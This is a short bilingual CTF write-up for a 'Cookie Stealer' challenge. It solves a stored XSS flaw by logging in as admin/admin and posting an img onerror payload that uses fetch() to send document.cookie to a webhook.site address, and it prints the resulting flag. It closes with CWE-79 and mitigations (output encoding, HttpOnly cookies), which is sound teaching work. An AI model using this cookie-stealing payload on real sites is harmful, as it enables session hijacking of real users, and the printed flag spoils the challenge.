# Cookie Stealer

Author: 孫逸平

Date: 2024-05-24

Link: https://lotuxctf.com/challenges#Cookie%20Stealer-41

## 題目說明

我要製作一個網站偷走所有人的餅乾！

I will make a website to steal everyone's cookie!


Author：FlyDragon
http://lotuxctf.com:20005

> **Hint1:**
>
> "Share to admin" 指的是 admin 會拜訪你的網頁。
>
> "Share to admin" implies that the admin will visit your page.

> **Hint2:**
>
> The flag is admin's cookie

## Write-up

1. 利用帳號：`admin`，密碼：`admin` 登入。
2. 任意撰寫內文發送後猜測為 XSS 漏洞。
3. 利用 webhook.site 擷取 Cookie：
    ```javascript
    <img src=x onerror="fetch('https://webhook.site/YourWebhookLink/?cookie='+document.cookie)"/>
    ```
4. 在 webhook.site 中，得到 flag：`LoTuX{XSS_ch4ll3nGe_For_8abYs}`。

## 防護說明與建議

### 本題 CWE

* CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

### 建議防護與修補

* 輸出編碼
* Cookie 設為 HttpOnly

## 心得

這題原本在 HTML 標籤中相加字串，後來發現不能這麼做，所以只好用 JavaScript 去寫。
